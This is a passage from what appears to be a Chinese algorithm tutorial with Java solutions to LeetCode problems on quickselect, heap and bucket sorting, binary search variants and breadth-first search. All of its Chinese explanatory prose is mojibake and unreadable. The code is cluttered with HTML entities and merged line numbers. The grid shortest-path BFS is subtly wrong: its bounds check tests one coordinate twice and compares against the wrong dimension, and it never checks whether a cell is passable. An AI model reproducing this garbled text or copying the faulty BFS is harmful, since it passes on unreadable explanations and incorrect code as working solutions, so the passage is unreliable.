Elementã€‚å¿«é€Ÿé€‰æ‹©ä¹Ÿå¯ä»¥æ±‚è§£ TopK Elements é—®é¢˜ï¼Œå› ä¸ºæ‰¾åˆ° Kth Element ä¹‹åï¼Œå†éå†ä¸€æ¬¡æ•°ç»„ï¼Œæ‰€æœ‰å°äºç­‰äº Kth Element çš„å…ƒç´ éƒ½æ˜¯ TopK Elementsã€‚å¯ä»¥çœ‹åˆ°ï¼Œå¿«é€Ÿé€‰æ‹©å’Œå †æ’åºéƒ½å¯ä»¥æ±‚è§£ Kth Element å’Œ TopK Elements é—®é¢˜ã€‚ Kth Element 215. Kth Largest Element in an Array (Medium) æ’åº ï¼šæ—¶é—´å¤æ‚åº¦ O(NlogN)ï¼Œç©ºé—´å¤æ‚åº¦ O(1) 1234public int findKthLargest(int[] nums, int k) &#123; Arrays.sort(nums); return nums[nums.length - k];&#125; å †æ’åº ï¼šæ—¶é—´å¤æ‚åº¦ O(NlogK)ï¼Œç©ºé—´å¤æ‚åº¦ O(K)ã€‚ 123456789public int findKthLargest(int[] nums, int k) &#123; PriorityQueue&lt;Integer&gt; pq = new PriorityQueue&lt;&gt;(); // å°é¡¶å † for (int val : nums) &#123; pq.add(val); if (pq.size() &gt; k) // ç»´æŠ¤å †çš„å¤§å°ä¸º K pq.poll(); &#125; return pq.peek();&#125; å¿«é€Ÿé€‰æ‹© ï¼šæ—¶é—´å¤æ‚åº¦ O(N)ï¼Œç©ºé—´å¤æ‚åº¦ O(1) 1234567891011121314151617181920212223242526272829303132333435public int findKthLargest(int[] nums, int k) &#123; k = nums.length - k; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int j = partition(nums, l, h); if (j == k) &#123; break; &#125; else if (j &lt; k) &#123; l = j + 1; &#125; else &#123; h = j - 1; &#125; &#125; return nums[k];&#125;private int partition(int[] a, int l, int h) &#123; int i = l, j = h + 1; while (true) &#123; while (a[++i] &lt; a[l] &amp;&amp; i &lt; h) ; while (a[--j] &gt; a[l] &amp;&amp; j &gt; l) ; if (i &gt;= j) &#123; break; &#125; swap(a, i, j); &#125; swap(a, l, j); return j;&#125;private void swap(int[] a, int i, int j) &#123; int t = a[i]; a[i] = a[j]; a[j] = t;&#125; æ¡¶æ’åºå‡ºç°é¢‘ç‡æœ€å¤šçš„ k ä¸ªæ•° 347. Top K Frequent Elements (Medium) 1Given [1,1,1,2,2,3] and k = 2, return [1,2]. è®¾ç½®è‹¥å¹²ä¸ªæ¡¶ï¼Œæ¯ä¸ªæ¡¶å­˜å‚¨å‡ºç°é¢‘ç‡ç›¸åŒçš„æ•°ï¼Œå¹¶ä¸”æ¡¶çš„ä¸‹æ ‡ä»£è¡¨æ¡¶ä¸­æ•°å‡ºç°çš„é¢‘ç‡ï¼Œå³ç¬¬ i ä¸ªæ¡¶ä¸­å­˜å‚¨çš„æ•°å‡ºç°çš„é¢‘ç‡ä¸º iã€‚æŠŠæ•°éƒ½æ”¾åˆ°æ¡¶ä¹‹åï¼Œä»åå‘å‰éå†æ¡¶ï¼Œæœ€å…ˆå¾—åˆ°çš„ k ä¸ªæ•°å°±æ˜¯å‡ºç°é¢‘ç‡æœ€å¤šçš„çš„ k ä¸ªæ•°ã€‚ 123456789101112131415161718192021public List&lt;Integer&gt; topKFrequent(int[] nums, int k) &#123; Map&lt;Integer, Integer&gt; frequencyForNum = new HashMap&lt;&gt;(); for (int num : nums) &#123; frequencyForNum.put(num, frequencyForNum.getOrDefault(num, 0) + 1); &#125; List&lt;Integer&gt;[] buckets = new ArrayList[nums.length + 1]; for (int key : frequencyForNum.keySet()) &#123; int frequency = frequencyForNum.get(key); if (buckets[frequency] == null) &#123; buckets[frequency] = new ArrayList&lt;&gt;(); &#125; buckets[frequency].add(key); &#125; List&lt;Integer&gt; topK = new ArrayList&lt;&gt;(); for (int i = buckets.length - 1; i &gt;= 0 &amp;&amp; topK.size() &lt; k; i--) &#123; if (buckets[i] != null) &#123; topK.addAll(buckets[i]); &#125; &#125; return topK;&#125; æŒ‰ç…§å­—ç¬¦å‡ºç°æ¬¡æ•°å¯¹å­—ç¬¦ä¸²æ’åº 451. Sort Characters By Frequency (Medium) 123456789Input:"tree"Output:"eert"Explanation:'e' appears twice while 'r' and 't' both appear once.So 'e' must appear before both 'r' and 't'. Therefore "eetr" is also a valid answer. 1234567891011121314151617181920212223242526public String frequencySort(String s) &#123; Map&lt;Character, Integer&gt; frequencyForNum = new HashMap&lt;&gt;(); for (char c : s.toCharArray()) frequencyForNum.put(c, frequencyForNum.getOrDefault(c, 0) + 1); List&lt;Character&gt;[] frequencyBucket = new ArrayList[s.length() + 1]; for (char c : frequencyForNum.keySet()) &#123; int f = frequencyForNum.get(c); if (frequencyBucket[f] == null) &#123; frequencyBucket[f] = new ArrayList&lt;&gt;(); &#125; frequencyBucket[f].add(c); &#125; StringBuilder str = new StringBuilder(); for (int i = frequencyBucket.length - 1; i &gt;= 0; i--) &#123; if (frequencyBucket[i] == null) &#123; continue; &#125; for (char c : frequencyBucket[i]) &#123; for (int j = 0; j &lt; i; j++) &#123; str.append(c); &#125; &#125; &#125; return str.toString();&#125; è·å…°å›½æ——é—®é¢˜è·å…°å›½æ——åŒ…å«ä¸‰ç§é¢œè‰²ï¼šçº¢ã€ç™½ã€è“ã€‚æœ‰è¿™ä¸‰ç§é¢œè‰²çš„çƒï¼Œç®—æ³•çš„ç›®æ ‡æ˜¯å°†è¿™ä¸‰ç§çƒæŒ‰é¢œè‰²é¡ºåºæ­£ç¡®åœ°æ’åˆ—ã€‚ å®ƒå…¶å®æ˜¯ä¸‰å‘åˆ‡åˆ†å¿«é€Ÿæ’åºçš„ä¸€ç§å˜ç§ï¼Œåœ¨ä¸‰å‘åˆ‡åˆ†å¿«é€Ÿæ’åºä¸­ï¼Œæ¯æ¬¡åˆ‡åˆ†éƒ½å°†æ•°ç»„åˆ†æˆä¸‰ä¸ªåŒºé—´ï¼šå°äºåˆ‡åˆ†å…ƒç´ ã€ç­‰äºåˆ‡åˆ†å…ƒç´ ã€å¤§äºåˆ‡åˆ†å…ƒç´ ï¼Œè€Œè¯¥ç®—æ³•æ˜¯å°†æ•°ç»„åˆ†æˆä¸‰ä¸ªåŒºé—´ï¼šç­‰äºçº¢è‰²ã€ç­‰äºç™½è‰²ã€ç­‰äºè“è‰²ã€‚ æŒ‰é¢œè‰²è¿›è¡Œæ’åº 75. Sort Colors (Medium) 12Input: [2,0,2,1,1,0]Output: [0,0,1,1,2,2] é¢˜ç›®æè¿°ï¼šåªæœ‰ 0/1/2 ä¸‰ç§é¢œè‰²ã€‚ 123456789101112131415161718public void sortColors(int[] nums) &#123; int zero = -1, one = 0, two = nums.length; while (one &lt; two) &#123; if (nums[one] == 0) &#123; swap(nums, ++zero, one++); &#125; else if (nums[one] == 2) &#123; swap(nums, --two, one); &#125; else &#123; ++one; &#125; &#125;&#125;private void swap(int[] nums, int i, int j) &#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t;&#125; äºŒåˆ†æŸ¥æ‰¾æ­£å¸¸å®ç° 1234567891011121314public int binarySearch(int[] nums, int key) &#123; int l = 0, h = nums.length - 1; while (l &lt;= h) &#123; int m = l + (h - l) / 2; if (nums[m] == key) &#123; return m; &#125; else if (nums[m] &gt; key) &#123; h = m - 1; &#125; else &#123; l = m + 1; &#125; &#125; return -1;&#125; æ—¶é—´å¤æ‚åº¦ äºŒåˆ†æŸ¥æ‰¾ä¹Ÿç§°ä¸ºæŠ˜åŠæŸ¥æ‰¾ï¼Œæ¯æ¬¡éƒ½èƒ½å°†æŸ¥æ‰¾åŒºé—´å‡åŠï¼Œè¿™ç§æŠ˜åŠç‰¹æ€§çš„ç®—æ³•æ—¶é—´å¤æ‚åº¦éƒ½ä¸º O(logN)ã€‚ m è®¡ç®— æœ‰ä¸¤ç§è®¡ç®—ä¸­å€¼ m çš„æ–¹å¼ï¼š m = (l + h) / 2 m = l + (h - l) / 2 l + h å¯èƒ½å‡ºç°åŠ æ³•æº¢å‡ºï¼Œæœ€å¥½ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼ã€‚ è¿”å›å€¼ å¾ªç¯é€€å‡ºæ—¶å¦‚æœä»ç„¶æ²¡æœ‰æŸ¥æ‰¾åˆ° keyï¼Œé‚£ä¹ˆè¡¨ç¤ºæŸ¥æ‰¾å¤±è´¥ã€‚å¯ä»¥æœ‰ä¸¤ç§è¿”å›å€¼ï¼š -1ï¼šä»¥ä¸€ä¸ªé”™è¯¯ç è¡¨ç¤ºæ²¡æœ‰æŸ¥æ‰¾åˆ° key lï¼šå°† key æ’å…¥åˆ° nums ä¸­çš„æ­£ç¡®ä½ç½® å˜ç§ äºŒåˆ†æŸ¥æ‰¾å¯ä»¥æœ‰å¾ˆå¤šå˜ç§ï¼Œå˜ç§å®ç°è¦æ³¨æ„è¾¹ç•Œå€¼çš„åˆ¤æ–­ã€‚ä¾‹å¦‚åœ¨ä¸€ä¸ªæœ‰é‡å¤å…ƒç´ çš„æ•°ç»„ä¸­æŸ¥æ‰¾ key çš„æœ€å·¦ä½ç½®çš„å®ç°å¦‚ä¸‹ï¼š 123456789101112public int binarySearch(int[] nums, int key) &#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &gt;= key) &#123; h = m; &#125; else &#123; l = m + 1; &#125; &#125; return l;&#125; è¯¥å®ç°å’Œæ­£å¸¸å®ç°æœ‰ä»¥ä¸‹ä¸åŒï¼š å¾ªç¯æ¡ä»¶ä¸º l &lt; h h çš„èµ‹å€¼è¡¨è¾¾å¼ä¸º h = m æœ€åè¿”å› l è€Œä¸æ˜¯ -1 åœ¨ nums[m] &gt;= key çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æ¨å¯¼å‡ºæœ€å·¦ key ä½äº [l, m] åŒºé—´ä¸­ï¼Œè¿™æ˜¯ä¸€ä¸ªé—­åŒºé—´ã€‚h çš„èµ‹å€¼è¡¨è¾¾å¼ä¸º h = mï¼Œå› ä¸º m ä½ç½®ä¹Ÿå¯èƒ½æ˜¯è§£ã€‚ åœ¨ h çš„èµ‹å€¼è¡¨è¾¾å¼ä¸º h = mid çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå¾ªç¯æ¡ä»¶ä¸º l &lt;= hï¼Œé‚£ä¹ˆä¼šå‡ºç°å¾ªç¯æ— æ³•é€€å‡ºçš„æƒ…å†µï¼Œå› æ­¤å¾ªç¯æ¡ä»¶åªèƒ½æ˜¯ l &lt; hã€‚ä»¥ä¸‹æ¼”ç¤ºäº†å¾ªç¯æ¡ä»¶ä¸º l &lt;= h æ—¶å¾ªç¯æ— æ³•é€€å‡ºçš„æƒ…å†µï¼š 1234567nums = &#123;0, 1, 2&#125;, key = 1l m h0 1 2 nums[m] &gt;= key0 0 1 nums[m] &lt; key1 1 1 nums[m] &gt;= key1 1 1 nums[m] &gt;= key... å½“å¾ªç¯ä½“é€€å‡ºæ—¶ï¼Œä¸è¡¨ç¤ºæ²¡æœ‰æŸ¥æ‰¾åˆ° keyï¼Œå› æ­¤æœ€åè¿”å›çš„ç»“æœä¸åº”è¯¥ä¸º -1ã€‚ä¸ºäº†éªŒè¯æœ‰æ²¡æœ‰æŸ¥æ‰¾åˆ°ï¼Œéœ€è¦åœ¨è°ƒç”¨ç«¯åˆ¤æ–­ä¸€ä¸‹è¿”å›ä½ç½®ä¸Šçš„å€¼å’Œ key æ˜¯å¦ç›¸ç­‰ã€‚ æ±‚å¼€æ–¹ 69. Sqrt(x) (Easy) 123456Input: 4Output: 2Input: 8Output: 2Explanation: The square root of 8 is 2.82842..., and since we want to return an integer, the decimal part will be truncated. ä¸€ä¸ªæ•° x çš„å¼€æ–¹ sqrt ä¸€å®šåœ¨ 0 \ x ä¹‹é—´ï¼Œå¹¶ä¸”æ»¡è¶³ sqrt == x / sqrtã€‚å¯ä»¥åˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾åœ¨ 0 \ x ä¹‹é—´æŸ¥æ‰¾ sqrtã€‚ å¯¹äº x = 8ï¼Œå®ƒçš„å¼€æ–¹æ˜¯ 2.82842â€¦ï¼Œæœ€ååº”è¯¥è¿”å› 2 è€Œä¸æ˜¯ 3ã€‚åœ¨å¾ªç¯æ¡ä»¶ä¸º l &lt;= h å¹¶ä¸”å¾ªç¯é€€å‡ºæ—¶ï¼Œh æ€»æ˜¯æ¯” l å° 1ï¼Œä¹Ÿå°±æ˜¯è¯´ h = 2ï¼Œl = 3ï¼Œå› æ­¤æœ€åçš„è¿”å›å€¼åº”è¯¥ä¸º h è€Œä¸æ˜¯ lã€‚ 123456789101112131415161718public int mySqrt(int x) &#123; if (x &lt;= 1) &#123; return x; &#125; int l = 1, h = x; while (l &lt;= h) &#123; int mid = l + (h - l) / 2; int sqrt = x / mid; if (sqrt == mid) &#123; return mid; &#125; else if (mid &gt; sqrt) &#123; h = mid - 1; &#125; else &#123; l = mid + 1; &#125; &#125; return h;&#125; å¤§äºç»™å®šå…ƒç´ çš„æœ€å°å…ƒç´  744. Find Smallest Letter Greater Than Target (Easy) 123456789Input:letters = ["c", "f", "j"]target = "d"Output: "f"Input:letters = ["c", "f", "j"]target = "k"Output: "c" é¢˜ç›®æè¿°ï¼šç»™å®šä¸€ä¸ªæœ‰åºçš„å­—ç¬¦æ•°ç»„ letters å’Œä¸€ä¸ªå­—ç¬¦ targetï¼Œè¦æ±‚æ‰¾å‡º letters ä¸­å¤§äº target çš„æœ€å°å­—ç¬¦ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±è¿”å›ç¬¬ 1 ä¸ªå­—ç¬¦ã€‚ 12345678910111213public char nextGreatestLetter(char[] letters, char target) &#123; int n = letters.length; int l = 0, h = n - 1; while (l &lt;= h) &#123; int m = l + (h - l) / 2; if (letters[m] &lt;= target) &#123; l = m + 1; &#125; else &#123; h = m - 1; &#125; &#125; return l &lt; n ? letters[l] : letters[0];&#125; æœ‰åºæ•°ç»„çš„ Single Element 540. Single Element in a Sorted Array (Medium) 12Input: [1,1,2,3,3,4,4,8,8]Output: 2 é¢˜ç›®æè¿°ï¼šä¸€ä¸ªæœ‰åºæ•°ç»„åªæœ‰ä¸€ä¸ªæ•°ä¸å‡ºç°ä¸¤æ¬¡ï¼Œæ‰¾å‡ºè¿™ä¸ªæ•°ã€‚è¦æ±‚ä»¥ O(logN) æ—¶é—´å¤æ‚åº¦è¿›è¡Œæ±‚è§£ã€‚ ä»¤ index ä¸º Single Element åœ¨æ•°ç»„ä¸­çš„ä½ç½®ã€‚å¦‚æœ m ä¸ºå¶æ•°ï¼Œå¹¶ä¸” m + 1 &lt; indexï¼Œé‚£ä¹ˆ nums[m] == nums[m + 1]ï¼›m + 1 &gt;= indexï¼Œé‚£ä¹ˆ nums[m] != nums[m + 1]ã€‚ ä»ä¸Šé¢çš„è§„å¾‹å¯ä»¥çŸ¥é“ï¼Œå¦‚æœ nums[m] == nums[m + 1]ï¼Œé‚£ä¹ˆ index æ‰€åœ¨çš„æ•°ç»„ä½ç½®ä¸º [m + 2, h]ï¼Œæ­¤æ—¶ä»¤ l = m + 2ï¼›å¦‚æœ nums[m] != nums[m + 1]ï¼Œé‚£ä¹ˆ index æ‰€åœ¨çš„æ•°ç»„ä½ç½®ä¸º [l, m]ï¼Œæ­¤æ—¶ä»¤ h = mã€‚ å› ä¸º h çš„èµ‹å€¼è¡¨è¾¾å¼ä¸º h = mï¼Œé‚£ä¹ˆå¾ªç¯æ¡ä»¶ä¹Ÿå°±åªèƒ½ä½¿ç”¨ l &lt; h è¿™ç§å½¢å¼ã€‚ 123456789101112131415public int singleNonDuplicate(int[] nums) &#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (m % 2 == 1) &#123; m--; // ä¿è¯ l/h/m éƒ½åœ¨å¶æ•°ä½ï¼Œä½¿å¾—æŸ¥æ‰¾åŒºé—´å¤§å°ä¸€ç›´éƒ½æ˜¯å¥‡æ•° &#125; if (nums[m] == nums[m + 1]) &#123; l = m + 2; &#125; else &#123; h = m; &#125; &#125; return nums[l];&#125; ç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬ 278. First Bad Version (Easy) é¢˜ç›®æè¿°ï¼šç»™å®šä¸€ä¸ªå…ƒç´  n ä»£è¡¨æœ‰ [1, 2, â€¦, n] ç‰ˆæœ¬ï¼Œå¯ä»¥è°ƒç”¨ isBadVersion(int x) çŸ¥é“æŸä¸ªç‰ˆæœ¬æ˜¯å¦é”™è¯¯ï¼Œè¦æ±‚æ‰¾åˆ°ç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬ã€‚ å¦‚æœç¬¬ m ä¸ªç‰ˆæœ¬å‡ºé”™ï¼Œåˆ™è¡¨ç¤ºç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬åœ¨ [l, m] ä¹‹é—´ï¼Œä»¤ h = mï¼›å¦åˆ™ç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬åœ¨ [m + 1, h] ä¹‹é—´ï¼Œä»¤ l = m + 1ã€‚ å› ä¸º h çš„èµ‹å€¼è¡¨è¾¾å¼ä¸º h = mï¼Œå› æ­¤å¾ªç¯æ¡ä»¶ä¸º l &lt; hã€‚ 123456789101112public int firstBadVersion(int n) &#123; int l = 1, h = n; while (l &lt; h) &#123; int mid = l + (h - l) / 2; if (isBadVersion(mid)) &#123; h = mid; &#125; else &#123; l = mid + 1; &#125; &#125; return l;&#125; æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­— 153. Find Minimum in Rotated Sorted Array (Medium) 12Input: [3,4,5,1,2],Output: 1 123456789101112public int findMin(int[] nums) &#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &lt;= nums[h]) &#123; h = m; &#125; else &#123; l = m + 1; &#125; &#125; return nums[l];&#125; æŸ¥æ‰¾åŒºé—´ 34. Search for a Range (Medium) 12345Input: nums = [5,7,7,8,8,10], target = 8Output: [3,4]Input: nums = [5,7,7,8,8,10], target = 6Output: [-1,-1] 12345678910111213141516171819202122public int[] searchRange(int[] nums, int target) &#123; int first = binarySearch(nums, target); int last = binarySearch(nums, target + 1) - 1; if (first == nums.length || nums[first] != target) &#123; return new int[]&#123;-1, -1&#125;; &#125; else &#123; return new int[]&#123;first, Math.max(first, last)&#125;; &#125;&#125;private int binarySearch(int[] nums, int target) &#123; int l = 0, h = nums.length; // æ³¨æ„ h çš„åˆå§‹å€¼ while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &gt;= target) &#123; h = m; &#125; else &#123; l = m + 1; &#125; &#125; return l;&#125; æœç´¢æ·±åº¦ä¼˜å…ˆæœç´¢å’Œå¹¿åº¦ä¼˜å…ˆæœç´¢å¹¿æ³›è¿ç”¨äºæ ‘å’Œå›¾ä¸­ï¼Œä½†æ˜¯å®ƒä»¬çš„åº”ç”¨è¿œè¿œä¸æ­¢å¦‚æ­¤ã€‚ BFS å¹¿åº¦ä¼˜å…ˆæœç´¢çš„æœç´¢è¿‡ç¨‹æœ‰ç‚¹åƒä¸€å±‚ä¸€å±‚åœ°è¿›è¡Œéå†ï¼Œæ¯å±‚éå†éƒ½ä»¥ä¸Šä¸€å±‚éå†çš„ç»“æœä½œä¸ºèµ·ç‚¹ï¼Œéå†ä¸€ä¸ªè·ç¦»èƒ½è®¿é—®åˆ°çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéå†è¿‡çš„èŠ‚ç‚¹ä¸èƒ½å†æ¬¡è¢«éå†ã€‚ ç¬¬ä¸€å±‚ï¼š 0 -&gt; {6,2,1,5}; ç¬¬äºŒå±‚ï¼š 6 -&gt; {4} 2 -&gt; {} 1 -&gt; {} 5 -&gt; {3} ç¬¬ä¸‰å±‚ï¼š 4 -&gt; {} 3 -&gt; {} å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸€å±‚éå†çš„èŠ‚ç‚¹éƒ½ä¸æ ¹èŠ‚ç‚¹è·ç¦»ç›¸åŒã€‚è®¾ di è¡¨ç¤ºç¬¬ i ä¸ªèŠ‚ç‚¹ä¸æ ¹èŠ‚ç‚¹çš„è·ç¦»ï¼Œæ¨å¯¼å‡ºä¸€ä¸ªç»“è®ºï¼šå¯¹äºå…ˆéå†çš„èŠ‚ç‚¹ i ä¸åéå†çš„èŠ‚ç‚¹ jï¼Œæœ‰ di&lt;=djã€‚åˆ©ç”¨è¿™ä¸ªç»“è®ºï¼Œå¯ä»¥æ±‚è§£æœ€çŸ­è·¯å¾„ç­‰ æœ€ä¼˜è§£ é—®é¢˜ï¼šç¬¬ä¸€æ¬¡éå†åˆ°ç›®çš„èŠ‚ç‚¹ï¼Œå…¶æ‰€ç»è¿‡çš„è·¯å¾„ä¸ºæœ€çŸ­è·¯å¾„ã€‚åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ BFS åªèƒ½æ±‚è§£æ— æƒå›¾çš„æœ€çŸ­è·¯å¾„ã€‚ åœ¨ç¨‹åºå®ç° BFS æ—¶éœ€è¦è€ƒè™‘ä»¥ä¸‹é—®é¢˜ï¼š é˜Ÿåˆ—ï¼šç”¨æ¥å­˜å‚¨æ¯ä¸€è½®éå†å¾—åˆ°çš„èŠ‚ç‚¹ï¼› æ ‡è®°ï¼šå¯¹äºéå†è¿‡çš„èŠ‚ç‚¹ï¼Œåº”è¯¥å°†å®ƒæ ‡è®°ï¼Œé˜²æ­¢é‡å¤éå†ã€‚ è®¡ç®—åœ¨ç½‘æ ¼ä¸­ä»åŸç‚¹åˆ°ç‰¹å®šç‚¹çš„æœ€çŸ­è·¯å¾„é•¿åº¦ 1234[[1,1,0,1], [1,0,1,0], [1,1,1,1], [1,0,1,1]] 1 è¡¨ç¤ºå¯ä»¥ç»è¿‡æŸä¸ªä½ç½®ï¼Œæ±‚è§£ä» (0, 0) ä½ç½®åˆ° (tr, tc) ä½ç½®çš„æœ€çŸ­è·¯å¾„é•¿åº¦ã€‚ 1234567891011121314151617181920212223242526272829public int minPathLength(int[][] grids, int tr, int tc) &#123; final int[][] direction = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;&#125;; final int m = grids.length, n = grids[0].length; Queue&lt;Pair&lt;Integer, Integer&gt;&gt; queue = new LinkedList&lt;&gt;(); queue.add(new Pair&lt;&gt;(0, 0)); int pathLength = 0; while (!queue.isEmpty()) &#123; int size = queue.size(); pathLength++; while (size-- &gt; 0) &#123; Pair&lt;Integer, Integer&gt; cur = queue.poll(); for (int[] d : direction) &#123; int nr = cur.getKey() + d[0], nc = cur.getValue() + d[1]; Pair&lt;Integer, Integer&gt; next = new Pair&lt;&gt;(nr, nc); if (next.getKey() &lt; 0 || next.getValue() &gt;= m || next.getKey() &lt; 0 || next.getValue() &gt;= n) &#123; continue; &#125; grids[next.getKey()][next.getValue()] = 0; // æ ‡è®° if (next.getKey() == tr &amp;&amp; next.getValue() == tc) &#123; return pathLength; &#125; queue.add(next); &#125; &#125; &#125; return -1;&#125; ç»„æˆæ•´æ•°çš„æœ€å°å¹³æ–¹æ•°æ•°é‡ 279. Perfect Squares (Medium) 1For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9. å¯ä»¥å°†æ¯ä¸ªæ•´æ•°çœ‹æˆå›¾ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœä¸¤ä¸ªæ•´æ•°ä¹‹å·®ä¸ºä¸€ä¸ªå¹³æ–¹æ•°ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæ•´æ•°æ‰€åœ¨çš„èŠ‚ç‚¹å°±æœ‰ä¸€æ¡è¾¹ã€‚ è¦æ±‚è§£æœ€å°çš„å¹³æ–¹æ•°æ•°é‡ï¼Œå°±æ˜¯æ±‚è§£ä»èŠ‚ç‚¹ n åˆ°èŠ‚ç‚¹ 0 çš„æœ€çŸ­è·¯å¾„ã€‚ æœ¬é¢˜ä¹Ÿå¯ä»¥ç”¨åŠ¨æ€è§„åˆ’æ±‚è§£ï¼Œåœ¨ä¹‹ååŠ¨æ€è§„åˆ’éƒ¨åˆ†ä¸­ä¼šå†æ¬¡å‡ºç°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public int numSquares(int n) &#123; List&lt;Integer&gt; squares = generateSquares(n); Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;(); boolean[] marked = new boolean[n + 1]; queue.add(n); marked[n] = true; int level = 0; while (!queue.isEmpty()) &#123; int size = queue.size(); level++; while (size-- &gt; 0) &#123; int cur = queue.poll(); for (int s : squares) &#123; int next = cur - s; if (next &lt; 0) &#123; break; &#125; if (next == 0) &#123; return level; &#125; if (marked[next]) &#123; continue; &#125; marked[next] = true; queue.add(cur - s); &#125; &#125; &#125; return n;&#125;/** * ç”Ÿæˆå°äº n çš„å¹³æ–¹æ•°åºåˆ— * @return 1,4,9,... */private List&lt;Integer&gt; generateSquares(int n) &#123; List&lt;Integer&gt; squares = new ArrayList&lt;&gt;(); int square = 1; int diff = 3; while (square &lt;= n) &#123; squares.add(square); square += diff; diff += 2; &#125; return squares;&#125; æœ€çŸ­å•è¯è·¯å¾„ 127. Word Ladder (Medium) 123456789Input:beginWord = "hit",endWord = "cog",wordList = ["hot","dot","dog","lot","log","cog"]Output: 5Explanation: As one shortest transformation is "hit" -&gt; "hot" -&gt; "dot" -&gt; "dog" -&gt; "cog",return its length 5. 12345678Input:beginWord = "hit"endWord = "cog"wordList = ["hot","dot","dog","lot","log"]Output: 0Explanation: The endWord "cog" is not in wordList, therefore no possible transformation. æ‰¾å‡ºä¸€æ¡ä» beginWord åˆ° endWord çš„æœ€çŸ­è·¯å¾„ï¼Œæ¯æ¬¡ç§»åŠ¨è§„å®šä¸ºæ”¹å˜ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”æ”¹å˜ä¹‹åçš„å­—ç¬¦ä¸²å¿…é¡»åœ¨ wordList ä¸­ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public int ladderLength(String beginWord, String endWord, List&lt;String&gt; wordList) &#123; wordList.add(beginWord); int N = wordList.size(); int start = N - 1; int end = 0; while (end &lt; N &amp;&amp; !wordList.get(end).equals(endWord)) &#123; end++; &#125; if (end == N) &#123; return 0; &#125; List&lt;Integer&gt;[] graphic = buildGraphic(wordList); return getShortestPath(graphic, start, end);&#125;private List&lt;Integer&gt;[] buildGraphic(List&lt;String&gt; wordList) &#123; int N = wordList.size(); List&lt;Integer&gt;[] graphic = new List[N]; for (int i = 0; i &lt; N; i++) &#123; graphic[i] = new ArrayList&lt;&gt;(); for (int j = 0; j &lt; N; j++) &#123; if (isConnect(wordList.get(i), wordList.get(j))) &#123; graphic[i].add(j); &#125; &#125; &#125; return graphic;&#125;private boolean isConnect(String s1, String s2) &#123; int diffCnt = 0; for (int i = 0; i &lt; s1.length() &amp;&amp; diffCnt &lt;= 1; i++) &#123; if (s1.charAt(i) != s2.charAt(i)) &#123; diffCnt++; &#125; &#125; return diffCnt == 1;&#125;private int getShortestPath(List&lt;Integer&gt;[] graphic, int start, int end) &#123; Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;(); boolean[] marked = new boolean[graphic.length]; queue.add(start); marked[start] = true; int path = 1; while (!queue.isEmpty()) &#123; int size = queue.size(); path++; while (size-- &gt; 0) &#123; int cur = queue.poll(); for (int next : graphic[cur]) &#123; if (next == end) &#123; return path; &#125; if (marked[next]) &#123; continue; &#125; marked[next] = true; queue.add(next); &#125; &#125; &#125; return 0;&#125; DFS å¹¿åº¦ä¼˜å…ˆæœç´¢ä¸€å±‚ä¸€å±‚éå†ï¼Œæ¯ä¸€å±‚å¾—åˆ°çš„æ‰€æœ‰æ–°èŠ‚ç‚¹ï¼Œè¦ç”¨é˜Ÿåˆ—å­˜å‚¨èµ·æ¥ä»¥å¤‡ä¸‹ä¸€å±‚éå†çš„æ—¶å€™å†éå†ã€‚ è€Œæ·±åº¦ä¼˜å…ˆæœç´¢åœ¨å¾—åˆ°ä¸€ä¸ªæ–°èŠ‚ç‚¹æ—¶ç«‹é©¬å¯¹æ–°èŠ‚ç‚¹è¿›è¡Œéå†ï¼šä»èŠ‚ç‚¹ 0 å‡ºå‘å¼€å§‹éå†ï¼Œå¾—åˆ°åˆ°æ–°èŠ‚ç‚¹ 6 æ—¶ï¼Œç«‹é©¬å¯¹æ–°èŠ‚ç‚¹ 6 è¿›è¡Œéå†ï¼Œå¾—åˆ°æ–°èŠ‚ç‚¹ 4ï¼›å¦‚æ­¤åå¤ä»¥è¿™ç§æ–¹å¼éå†æ–°èŠ‚ç‚¹ï¼Œç›´åˆ°æ²¡æœ‰æ–°èŠ‚ç‚¹äº†ï¼Œæ­¤æ—¶è¿”å›ã€‚è¿”å›åˆ°æ ¹èŠ‚ç‚¹ 0 çš„æƒ…å†µæ˜¯ï¼Œç»§ç»­å¯¹æ ¹èŠ‚ç‚¹ 0 è¿›è¡Œéå†ï¼Œå¾—åˆ°æ–°èŠ‚ç‚¹ 2ï¼Œç„¶åç»§ç»­ä»¥ä¸Šæ­¥éª¤ã€‚ ä»ä¸€ä¸ªèŠ‚ç‚¹å‡ºå‘ï¼Œä½¿ç”¨ DFS 